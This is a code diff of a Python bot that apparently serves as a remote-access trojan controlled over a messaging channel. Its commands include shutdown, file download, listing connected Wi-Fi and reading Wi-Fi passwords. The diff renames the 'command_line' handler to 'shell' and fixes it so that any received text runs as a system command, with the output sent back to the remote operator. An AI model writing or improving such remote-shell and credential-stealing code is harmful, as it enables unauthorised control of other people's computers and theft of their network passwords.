@@ -44,7 +44,7 @@ if check_internret(): # if internet connection was success run main program
                 "/stop_bot",
                 "/pass", 
                 "/shutdown", 
-                "/command_line", 
+                "/shell", 
                 "/download",
                 "/connected_wifi",
                 "/wifi_password",
@@ -175,9 +175,9 @@ if check_internret(): # if internet connection was success run main program
             sleep(5)
             send_msg("If you see this message it means PC did not shutdown")
         except: send_msg("Error;")
-    def command_line():
+    def shell():
         try:
-            data = read_msg().replace("/open_site ", "")
+            data = read_msg().replace("/shell ", "")
             out = getoutput(data)
             send_msg("This is the response:\n" + out)
         except: send_msg("Error;")
@@ -365,7 +365,7 @@ Json format:
         global cwd
         while True:
             try:
-                command = read_msg()
+                command = str(read_msg())
                 if command.startswith("/pass"):  pass #TODO: convert pass -> continue
                 else:
                     if command.startswith("/check"): send_msg("This is check message")
@@ -376,7 +376,7 @@ Json format:
                     if command.startswith("/open_site"): open_site()
                     if command.startswith("/stop_bot"): stop_bot()
                     if command.startswith("/shutdown"): shutdown()
-                    if command.startswith("/command_line"): command_line()
+                    if command.startswith("/shell"): shell()
                     if command.startswith("/download"): download()
                     if command.startswith("/connected_wifi"): connected_wifi()
                     if command.startswith("/wifi_password"): wifi_password()
